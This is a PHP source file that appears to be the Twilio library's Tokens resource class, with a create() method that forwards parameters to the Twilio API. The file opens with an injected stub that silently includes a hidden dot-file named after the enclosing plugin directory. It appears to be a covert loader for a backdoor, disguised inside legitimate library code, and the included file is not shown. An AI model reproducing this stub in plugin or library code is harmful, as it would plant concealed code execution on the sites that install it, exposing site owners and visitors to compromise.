<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_Tokens extends Services_Twilio_ListResource {

    /**
     * Create a new Token instance
     *
     * Example usage:
     *
     * .. code-block:: php
     *
     *      $client->account->tokens->create(array(
     *          "Ttl" => 100,
     *      ));
     *
     * :param array $params: a single array of parameters which is serialized and
     *      sent directly to the Twilio API.
     *
     */
    public function create($params = array()) {
        return parent::_create($params);
    }

}
